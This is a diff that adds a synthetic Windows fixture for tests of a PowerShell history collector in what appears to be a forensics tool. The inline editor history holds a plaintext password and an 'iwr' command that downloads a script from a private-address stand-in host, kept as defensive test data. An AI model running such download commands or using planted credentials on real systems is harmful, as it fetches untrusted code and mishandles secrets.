@@ -1,0 +1,26 @@
+# SPDX-FileCopyrightText: 2026 aeterna-rongroi contributors
+# SPDX-License-Identifier: GPL-3.0-or-later
+# Synthetic fixture host — see ../PROVENANCE.md.
+# What ADR 0064's `powershell_text` collector reads, written by hand: PSReadLine's history folder with
+# the console's history (a synthetic file from fixtures/parsers/, a download-then-execute line to a
+# `.invalid` name among ordinary commands) and an editor's history written inline, which holds a
+# password and a path that the collector's tests assert reach no observation. The operational log is the
+# one vendored Event Log sample under the PowerShell log's name: it parses, and holds no PowerShell
+# record. The classic Windows PowerShell log is not there.
+platform: windows
+os_build: "26100"
+elevated: true
+env:
+  SystemRoot: 'C:\Windows'
+  APPDATA: 'C:\Users\fixtureuser\AppData\Roaming'
+filesystem:
+  'C:\Users\fixtureuser\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine':
+    - name: ConsoleHost_history.txt
+      from: '../../parsers/powershell-text/history-mixed-crlf.txt'
+    - name: Visual Studio Code Host_history.txt
+      content: "cd C:\\Users\\fixtureuser\\private-project\n$pw = 'correct horse battery'\niwr http://10.1.2.3/tool.ps1 -OutFile t.ps1\n"
+    - name: notes.txt
+      content: "not a history file\n"
+  'C:\Windows\System32\winevt\Logs':
+    - name: Microsoft-Windows-PowerShell%4Operational.evtx
+      from: '../../evtx/languagepacksetup-operational.evtx'
